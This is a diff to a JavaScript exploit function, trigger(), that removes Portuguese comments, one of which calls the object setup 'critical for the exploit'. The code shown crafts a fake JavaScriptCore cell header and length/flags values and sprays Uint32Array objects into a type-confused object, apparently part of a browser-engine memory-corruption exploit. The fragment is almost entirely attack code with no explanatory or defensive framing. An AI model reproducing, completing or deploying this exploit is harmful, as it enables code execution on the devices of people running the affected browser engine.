@@ -142,13 +142,11 @@ function trigger() {
         'a': 1
     };
     
-    // Otimização: Criar buffer uma vez e cachear referências críticas
     var test = new ArrayBuffer(0x1000);
-    var test_buffer = test.buffer; // Cache da referência do buffer
+    var test_buffer = test.buffer; 
     
     g_confuse_obj = {};
     
-    // Otimização: Pré-calcular valores int64 para evitar recriação
     var js_cell_header_val = new int64(0x00000800, 0x01182700).asJSValue();
     var len_flags_val = new int64(0x00000020, 0x00010001).asJSValue();
     
@@ -158,21 +156,18 @@ function trigger() {
         vector: g_inline_obj,
         len_and_flags: len_flags_val
     };
-    g_confuse_obj["0a"] = cell; // Manter string literal exata
+    g_confuse_obj["0a"] = cell; 
 
-    // Manter criação individual de objetos (crítico para o exploit)
     g_confuse_obj["1a"] = {};
     g_confuse_obj["1b"] = {};
     g_confuse_obj["1c"] = {};
     g_confuse_obj["1d"] = {};
 
-    // Otimização: Cache do Uint32Array constructor
     var Uint32ArrayCtor = Uint32Array;
     for (var j = 0x5; j < 0x20; j++) {
         g_confuse_obj[j + "a"] = new Uint32ArrayCtor(test);
     }
     
-    // Otimização: Cache do ArrayBuffer constructor
     var ArrayBufferCtor = ArrayBuffer;
     for (var k in o) {
         {
